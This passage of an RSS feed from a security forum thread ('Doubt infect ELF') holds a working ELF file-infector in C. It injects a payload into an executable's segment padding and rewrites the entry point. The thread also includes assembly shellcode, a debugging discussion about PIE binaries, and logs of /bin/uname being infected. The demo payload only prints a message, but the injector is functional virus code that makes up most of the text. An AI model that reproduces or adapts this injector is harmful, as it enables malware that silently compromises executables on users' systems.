        if(offset_mode == 0x01){
        	printf("offset == %p\n", p - elf_hdr-&gt;e_entry);
        	return 0;
        }

        // p_vaddr: Virtual address of the segment program in memory
        base = vitima_text_program-&gt;p_vaddr;

        printf ("+ Processando vitima -&gt; Endereco Base(Base Address) : 0x%p\n", (void*)base);

        /* Process payload */
        payload_fd = elfi_open_and_map (argv[2], &amp;MapeadoPayload, &amp;TamanhoPayload);

        // funcao que busca o segmento .text
        // MapeadoPayload: arquivo elf a ser injetado na vitima
        // payload_text_section: retorna com o section segmento do .text a ser injetado
        payload_text_section = elfi_find_section (MapeadoPayload, ".text");

        //mostraSectionHeaderELF(payload_text_section);

  /* XXX: Looks like we do not really have to patch the segment sizes */
  /*
  vitima_text_program-&gt;p_filesz += payload_text_section-&gt;sh_size;
  vitima_text_program-&gt;p_memsz += payload_text_section-&gt;sh_size;
  */

        printf ("+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset %lx (Tamanho: %lx bytes)\n",  payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size);

        if (payload_text_section-&gt;sh_size &gt; len)
        {
                fprintf (stderr, "- Processando Payload -&gt; Arquivo Payload muito grande, Não é possivel infectar.\n");
                exit (1);
        }
  /* Copy payload in the segment padding area */
  // memmove(dest, src, count): copia count bytes do buffer apontado por src para o buffer apontado por dest.
  //

  memmove (MapeadoVitima + p, MapeadoPayload + payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size );

  // jbx81: sorry but i don't speak portuguese :)

  if(elf_hdr-&gt;e_type == 0x02){
	  /* Patch return address */

	  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);

	  /* Patch entry point */
	  elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);

  } else if(elf_hdr-&gt;e_type == 0x03){
	  /*
	   * let's talk about how payload should be.
section .text
        global _start
_start:
        sub r12, 0x4f20 &lt;- put offset here!
        push rax
        push rdi
        push rsi
        push rdx

        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

        pop rdx
        pop rsi
        pop rdi
        pop rax
        jmp r12
align 8
        msg     db 'Arquivo infectado Teste',0x0a,0
        msg_end db 0x0


	   *
	   */
	  elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);
  }
  /* Close files and actually update target file */
  close (payload_fd);
  close (Vitima_fd);

  return 0;
}
</code></pre>
<p>shellcode.asm</p>
<pre><code>section .text
        global _start
_start:
	sub r12, 0x4f20
	push rax
	push rdi
	push rsi
	push rdx

        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

	pop rdx
	pop rsi
	pop rdi
	pop rax
	jmp r12
align 8
        msg     db 'Arquivo infectado Teste',0x0a,0
        msg_end db 0x0
</code></pre>
<p>usage:</p>
<pre><code>$ cp /bin/uname evil_uname
$ ./Infecta evil_uname 
Exemplo de virus ELF

Running in offset mode+ Arquivo mapeado (35032 bytes ) em 0x7fff7ae5a540
+ Processando Vitima -&gt; Valor do Entry point: 0x1f60
+ Processando Vitima -&gt; Encontrado segmento .text executavel (#2)
   * Processando Vitima -&gt; Encontrado segmento LOAD (#3) fechado para .text (offset: 0x7990)
offset == 0x4f20
$ #change offset on shellcoda.asm 
$ nasm -f elf64 shellcode.asm
$ ./Infecta evil_uname shellcode.o 
Exemplo de virus ELF

+ Arquivo mapeado (35032 bytes ) em 0x7ffc51d5d920
+ Processando Vitima -&gt; Valor do Entry point: 0x1f60
+ Processando Vitima -&gt; Encontrado segmento .text executavel (#2)
   * Processando Vitima -&gt; Encontrado segmento LOAD (#3) fechado para .text (offset: 0x7990)
+ Processando vitima -&gt; Endereco Base(Base Address) : 0x(nil)
+ Arquivo mapeado (704 bytes ) em 0x7ffc51d5d928
+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: 5 . Procurando pela seção '.text'
 + Processando payload -&gt; sname: ''
 + Processando payload -&gt; sname: '.text'
entrou no if retornando 
shdr-&gt;sh_name: 1  
shdr-&gt;sh_type: 1 
shdr-&gt;sh_addr: 0 
+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset 180 (Tamanho: 4a bytes)
$ ./evil_uname 
Arquivo infectado Teste
Linux
</code></pre>
<p>i will made official version of it.</p>
          <p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/doubt-infect-elf/13605/4</link>
        <pubDate>Sun, 12 May 2019 22:19:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13605-4</guid>
        <source url="https://0x00sec.org/t/doubt-infect-elf/13605.rss">Doubt infect ELF</source>
      </item>
      <item>
        <title>Doubt infect ELF</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/spiderslack">@spiderslack</a>,</p>
<p>You are trying to infect a PIE binary. PIE binaries get mapped at random position in memory so you cannot just jump to a fixed address. You may need to change your shellcode to use an offset or some other indirect technique to jump into your code.</p>
<p>Also this may give you some other hints.</p>
<aside class="quote" data-post="5" data-topic="6713">
  <div class="title">
    <div class="quote-controls"></div>
    <img alt="" width="20" height="20" src="/user_avatar/0x00sec.org/0x00pf/40/13708_2.png" class="avatar">
    <a href="https://0x00sec.org/t/segfaults-with-polycrypt-tutorial/6713/5">Segfaults With Polycrypt Tutorial</a> <a class="badge-wrapper  bullet" href="https://0x00sec.org/c/support/52"><span class="badge-category-bg" style="background-color: #BF1E2E;"></span><span style="" data-drop-close="true" class="badge-category clear-badge" title="Asking questions or not knowing something is not a bad thing on 0x00sec, in fact its something very critical to learning. However, asking in the correct way is very important. Posts like &quot;Plz help me hax my sk00l pls&quot; are considered spammy, and will be aggresively deleted. Please realise that nobody here owes you anything, it is up to you to gain respect and ask correctly. You do not deserve help, however people here are happy to help.">Questions</span></a>
  </div>
  <blockquote>
    Now you can try to make it work with PIE binaries. Hint:  Check /proc/PID/maps to figure out the real address at run-time. 
Do not forget to make a PR on my repo if you make it work <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title="wink" alt="wink" class="emoji">
  </blockquote>
</aside>

          <p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/doubt-infect-elf/13605/3</link>
        <pubDate>Sun, 12 May 2019 07:53:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13605-3</guid>
        <source url="https://0x00sec.org/t/doubt-infect-elf/13605.rss">Doubt infect ELF</source>
      </item>
      <item>
        <title>Doubt infect ELF</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Would be helpful to ping the author <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> .</p>
          <p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/doubt-infect-elf/13605/2</link>
        <pubDate>Sun, 12 May 2019 00:02:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13605-2</guid>
        <source url="https://0x00sec.org/t/doubt-infect-elf/13605.rss">Doubt infect ELF</source>
      </item>
      <item>
        <title>Doubt infect ELF</title>
        <dc:creator><![CDATA[spiderslack]]></dc:creator>
        <description><![CDATA[
            <p>Hi all.</p>
<p>I testing using the follow post <a href="https://0x00sec.org/t/elfun-file-injector/410" class="inline-onebox">ELFun File Injector</a>, but not work. bellow the post code i’m using.</p>
<p>------------------------------------ infecta.c ------------------------------------------------</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;


#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;

#include &lt;elf.h&gt;
#include &lt;sys/mman.h&gt;


/* Helper functions */
static int get_file_size (int fd)
{
        struct stat _info;
        fstat (fd, &amp;_info);
        return _info.st_size;
}

/* Open a file and map it in memory for easy update */
int elfi_open_and_map (char *fname, void **data, int *len)
{
        int size;
        int fd;

        if ((fd = open (fname, O_APPEND | O_RDWR, 0)) &lt; 0)
        {
                perror ("open:");
                exit (1);
        }

        size = get_file_size (fd);
        if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED)
        {
                perror ("mmap:");
                exit (1);
        }

        printf ("+ Arquivo mapeado (%d bytes ) em %p\n", size, data);
        *len = size;
        return fd;
}


#ifdef DEBUG
/* Debug function to dump registers */
void
elfi_dump_segments (void *d)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg;
  int         n_seg = elf_hdr-&gt;e_phnum;
  int         i;

//  printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));

  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
  for (i = 0; i &lt; n_seg; i++)
    {
        printf (" [INFO] Segment %d: Type: %8x (%x) Offset: %8x "
                "FSize:%8x MSize:%8x\n",
                i, elf_seg-&gt;p_type, elf_seg-&gt;p_flags,
                (unsigned int)elf_seg-&gt;p_offset,
                (unsigned int)elf_seg-&gt;p_filesz,
                (unsigned int)elf_seg-&gt;p_memsz);

      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg
                            + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

}
#endif

// len: tamanho do gap
// p: final do segmento
// d: arquivo elf com as section e program table
// fsize: tamanho do binario
//
//         /* Find executable segment and obtain offset and gap size */
//        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);
Elf64_Phdr* elfi_find_gap(void *mapeado, int TamanhoArquivo, int *p, int *len)
{
        // struct header ELF
        Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) mapeado;
        // struct program header
        Elf64_Phdr* elf_program, *text_program_vitima;
        // e_phnum: numero de entradas na tabela programa
        int         n_seg = elf_hdr-&gt;e_phnum;
        int         i;
        int         text_end, gap=TamanhoArquivo;

        //printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));
        //printf("O tamanho da variavel elf_hdr: %ld \n", sizeof(elf_hdr));
        //printf("O tamanho de struct elf_hdr-&gt;e_phoff: %ld \n", sizeof(elf_hdr-&gt;e_phoff));



        // e_phoff: aponta para o inicio da tabela de programa
        elf_program = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
//      printf("p_type %d \n", elf_seg-&gt;p_type);

        for (i = 0; i &lt; n_seg; i++)
        {
        //      printf("elf_program-&gt;p_flags: %#x\n", elf_program-&gt;p_flags);
        //      printf("elf_program-&gt;p_type: %#x\n", elf_program-&gt;p_type);
//      printf("elf_program-&gt;p_offset: %#lx\n", elf_program-&gt;p_offset);
        // p_flags: flags define o tipo do segmento(cabecalho de programa
        // Name         | Value   | Meaning
        // PF_X         | 0x1     | Execute
        // PF_W         | 0x2     | Write
        // PF_R         | 0x4     | Read
        // PF_MASKPROC  | 0xf0000000 | Unspecified
        // 0x1 and 0x011 = 1 (verdadeiro)
        // 0x2 and 0x011 = 0 (falso)
        // 0x4 and 0x011 = 0 (falso)
        // 0xf0000000 and 0x011 = 0 (falso)
        // Entao o comando: elf_seg-&gt;p_flags &amp; 0x011 -&gt; Procura por um segmento "execute"
        if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; elf_program-&gt;p_flags &amp; 0x011)
      {

                        printf ("+ Processando Vitima -&gt; Encontrado segmento .text executavel (#%d)\n", i);
        /*              printf("elf_program-&gt;p_type: %d \n", elf_program-&gt;p_type);
                        printf("elf_program-&gt;p_offset: %ld \n", elf_program-&gt;p_offset);
                        printf("elf_program-&gt;p_filesz: %ld \n", elf_program-&gt;p_filesz);
*/
                        //text_seg = elf_seg(o segmento progam atual
                        text_program_vitima = elf_program;


                        // elf_program-&gt;p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program-&gt;p_filesz: Size in bytes of the segment in the file image. May be 0.
                        // variavel text_end pega o tamanho do segmento text
                        text_end = elf_program-&gt;p_offset + elf_program-&gt;p_filesz;
//                      printf("o valor de text_end: %d \n", text_end);
      } else {
                        //p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program-&gt;p_offset do segundo segmento LOAD do tipo RW - o final do
                        // segmento LOAD Executavel
                        if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; (elf_program-&gt;p_offset - text_end) &lt; gap)
                        {

/*                      printf("elf_program-&gt;p_type: %d \n", elf_program-&gt;p_type);
                        printf("elf_program-&gt;p_offset: %lx \n", elf_program-&gt;p_offset);
                        printf("elf_program-&gt;p_filesz: %ld \n", elf_program-&gt;p_filesz);

                        printf("o valor de text_end: %d \n", text_end);
                        printf("o valor de gap: %d \n", gap);
*/
                        printf ("   * Processando Vitima -&gt; Encontrado segmento LOAD (#%d) fechado para .text (offset: 0x%x)\n", i, (unsigned int)elf_program-&gt;p_offset);

                                gap = elf_program-&gt;p_offset - text_end;
                        }
                }
                // q
                // e_phentsize: contem o tamanho de uma entrada de uma tabela de secao
      elf_program = (Elf64_Phdr *) ((unsigned char*) elf_program + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

        *p = text_end;
        *len = gap;


        return text_program_vitima;
}



Elf64_Shdr *elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  // e_shoff:   Points to the start of the section header table.
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr-&gt;e_shoff);
  // e_shstrndx: Contains index of the section header table entry that contains the section names.
  Elf64_Shdr *sh_strtab = &amp;shdr[elf_hdr-&gt;e_shstrndx];
  // sh_offset: Offset of the section in the file image.
  const char *const sh_strtab_p = data + sh_strtab-&gt;sh_offset;

  // e_shnum: Contains the number of entries in the section header table.
  printf ("+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: %d . Procurando pela seção '%s'\n", elf_hdr-&gt;e_shnum, name);


  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++)
  {
//      printf("Processamento Payload -&gt; O shdr[%d].sh_name: %x \n", i, shdr[i].sh_name);
        sname = (char*) (sh_strtab_p + shdr[i].sh_name);

        printf(" + Processando payload -&gt; sname: '%s'\n", sname);


        if (!strcmp (sname, name))
        {
                printf("entrou no if retornando \n");
                printf("shdr-&gt;sh_name: %x  \n", shdr[i].sh_name);


                printf("shdr-&gt;sh_type: %x \n", shdr[i].sh_type);
                printf("shdr-&gt;sh_addr: %lx \n", shdr[i].sh_addr);
                return &amp;shdr[i];
        }
  }

  return NULL;
}



// MapeadoVitima + p: e o arquivo vitima mapeado mais o program header
// len: tamanho do gap
// pat: padrao a buscar
// val: entrypoint do arquivo elf vitima
//
//  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);
int elfi_mem_subst(void *m, int len, long pat, long val)
{
        // obtem o endereco do program header da vitima
        unsigned char *p = (unsigned char*)m;
        long v;
        int i, r;

        /*
        printf("p: %hhn\n", p);
        printf("pat: %lx\n", pat);
        printf("val: %lx\n", val);
        printf("entrando no for\n\n");
*/
//      printf("len: %d \n", len);


        for (i = 0; i &lt; len; i++)
        {
                v = *((long*)(p+i));
                // faz um xor da variavel v e varial pat
                r = v ^pat;


//              printf("v: %lx\n", v);
        //      printf("r: %x\n", r);

                if (r ==0)
                {
                        printf ("+ Padrão %lx encontrado no offset %d -&gt; %lx\n", pat, i, val);
                        *((long*)(p+i)) = val;
                        return 0;
                }
        }
        return -1;
}

int main (int argc, char *argv[])
{
        void        *MapeadoVitima, *MapeadoPayload;
        int         Vitima_fd, payload_fd;
        int         TamanhoVitima, TamanhoPayload;
        // Struct para o header ELF
        Elf64_Ehdr* elf_hdr;
        // Struct para program header
        Elf64_Phdr  *vitima_text_program;
        // struct para section header
        Elf64_Shdr  *payload_text_section;
        // struct de enderecos base
        Elf64_Addr  base, ep;
        //variavel len = gap
        //variavel p=final do segmento LOAD executavel
        int         p, len;


        printf ("Exemplo de virus ELF\n\n");
        if (argc != 3)
        {
                fprintf (stderr, "Uso:\n  %s &lt;arquivo ELF&gt; &lt;payload&gt;\n", argv[0]);
                exit (1);
        }

        /* Open and map target ELF */
        Vitima_fd = elfi_open_and_map (argv[1], &amp;MapeadoVitima, &amp;TamanhoVitima);

        /* Get Application Entry point */
        elf_hdr = (Elf64_Ehdr *) MapeadoVitima;
        ep = elf_hdr-&gt;e_entry;
        printf ("+ Processando Vitima -&gt; Valor do Entry point: %p\n", (void*) ep);

#ifdef DEBUG
  elfi_dump_segments (d);
#endif

        /* Find executable segment and obtain offset and gap size */
        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);

        // p_vaddr: Virtual address of the segment program in memory
        base = vitima_text_program-&gt;p_vaddr;

        printf ("+ Processando vitima -&gt; Endereco Base(Base Address) : 0x%p\n", (void*)base);

        /* Process payload */
        payload_fd = elfi_open_and_map (argv[2], &amp;MapeadoPayload, &amp;TamanhoPayload);

        // funcao que busca o segmento .text
        // MapeadoPayload: arquivo elf a ser injetado na vitima
        // payload_text_section: retorna com o section segmento do .text a ser injetado
        payload_text_section = elfi_find_section (MapeadoPayload, ".text");

        //mostraSectionHeaderELF(payload_text_section);

  /* XXX: Looks like we do not really have to patch the segment sizes */
  /*
  vitima_text_program-&gt;p_filesz += payload_text_section-&gt;sh_size;
  vitima_text_program-&gt;p_memsz += payload_text_section-&gt;sh_size;
  */

        printf ("+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset %lx (Tamanho: %lx bytes)\n",  payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size);

        if (payload_text_section-&gt;sh_size &gt; len)
        {
                fprintf (stderr, "- Processando Payload -&gt; Arquivo Payload muito grande, Não é possivel infectar.\n");
                exit (1);
        }
  /* Copy payload in the segment padding area */
  // memmove(dest, src, count): copia count bytes do buffer apontado por src para o buffer apontado por dest.
  //

  memmove (MapeadoVitima + p, MapeadoPayload + payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size );

  /* Patch return address */
  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);

  /* Patch entry point */
  elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);

  /* Close files and actually update target file */
  close (payload_fd);
  close (Vitima_fd);

  return 0;
}
</code></pre>
<p>My payload is:</p>
<p>------------payload.asm-------------</p>
<pre><code>section .text
        global _start
_start:
        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

        mov rax, 0x11111111
        jmp rax
align 8
        msg     db 'Arquivo infectado Teste',0x0a,0
        msg_end db 0x0
</code></pre>
<p>I am trying to infect the uname binary.</p>
<blockquote>
<p>root@bumblee:~/dev/infectELF/versao3# /bin/uname<br>
Linux<br>
root@bumblee:~/dev/infectELF/versao3#</p>
</blockquote>
<pre><code>root@bumblee:~/dev/infectELF/versao3# ./infecta ./uname payload
Exemplo de virus ELF

+ Arquivo mapeado (35032 bytes ) em 0x7ffd3f89dee0
+ Processando Vitima -&gt; Valor do Entry point: 0x1f60
+ Processando Vitima -&gt; Encontrado segmento .text executavel (#2)
   * Processando Vitima -&gt; Encontrado segmento LOAD (#3) fechado para .text (offset: 0x7990)
+ Processando vitima -&gt; Endereco Base(Base Address) : 0x(nil)
+ Arquivo mapeado (808 bytes ) em 0x7ffd3f89dee8
+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: 5 . Procurando pela seção '.text'
 + Processando payload -&gt; sname: ''
 + Processando payload -&gt; sname: '.text'
entrou no if retornando
shdr-&gt;sh_name: 1b
shdr-&gt;sh_type: 1
shdr-&gt;sh_addr: 400080
+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset 80 (Tamanho: 3a bytes)
+ Padrão 11111111 encontrado no offset 25 -&gt; 1f60
root@bumblee:~/dev/infectELF/versao3#
</code></pre>
<p>note the entrypoint address of the original binary file is 0x1f60</p>
<blockquote>
<p>root@bumblee:~/dev/infectELF/versao3# readelf -h /bin/uname<br>
ELF Header:<br>
Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00<br>
Class:                             ELF64<br>
Data:                              2’s complement, little endian<br>
Version:                           1 (current)<br>
OS/ABI:                            UNIX - System V<br>
ABI Version:                       0<br>
Type:                              DYN (Shared object file)<br>
Machine:                           Advanced Micro Devices X86-64<br>
Version:                           0x1<br>
Entry point address:               0x1f60<br>
Start of program headers:          64 (bytes into file)<br>
Start of section headers:          33240 (bytes into file)<br>
Flags:                             0x0<br>
Size of this header:               64 (bytes)<br>
Size of program headers:           56 (bytes)<br>
Number of program headers:         9<br>
Size of section headers:           64 (bytes)<br>
Number of section headers:         28<br>
Section header string table index: 27<br>
root@bumblee:~/dev/infectELF/versao3#</p>
</blockquote>
<p>after infecting it it changes the entrypoint to address 0x6e80 by picking up the code of 6e80 I see the following opcodes(i using the xxd command)</p>
<blockquote>
<p>00006e80: b801 0000 00bf 0100 0000 488d 350f 0000<br>
00006e90: 00ba 2600 0000 0f05 b860 1f00 00ff e0 000<br>
00006ea0: 0072 7175 6976 6f20 696e 6665 6374 6164<br>
00006eb0: 6f20 5375 6375 7269 2048 6163 6b65 7220<br>
00006ec0: 436c 7562 0a00 0000 0000 0000 0000 0000</p>
</blockquote>
<p>copying the opcode string and playing on the site <a href="http://disassembler.io" rel="noopener nofollow ugc">disassembler.io</a>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/62314669c3e0b5471bba36d36f333139b31c8f3d.png" alt="hacker01" data-base62-sha1="e0EmwXSGSE7eiNEVWs4weOkZDVX" width="690" height="299"></p>
<p>note that the assembly code is to display the message and then jump to the address 0x1f60 which is the oirginal entrypoint of the uname binary file. But I get the message of segment fault</p>
<pre><code>root@bumblee:~/dev/infectELF/versao3# ./uname
Arquivo infectado teste
Segmentation fault (core dumped)
root@bumblee:~/dev/infectELF/versao3#
</code></pre>
<p>Could someone help me where I’m wrong?</p>
<pre><code>root@bumblee:~/dev/infectELF/versao3# dmesg
[ 1623.698745] uname[1402]: segfault at 1f60 ip 0000560080a57e9d sp 00007ffe8923a260 error 6 in uname[560080a51000+7000]
root@bumblee:~/dev/infectELF/versao3#
</code></pre>
<p>In dmesg I have a message but I do not quite understand</p>
<p>someone can help me understand what I’m doing wrong. Thank you very much in advance</p>
<p>Regards</p>
          <p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/doubt-infect-elf/13605/1</link>
        <pubDate>Sat, 11 May 2019 23:26:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-13605-1</guid>
        <source url="https://0x00sec.org/t/doubt-infect-elf/13605.rss">Doubt infect ELF</source>
      </item>
  </channel>
</rss>
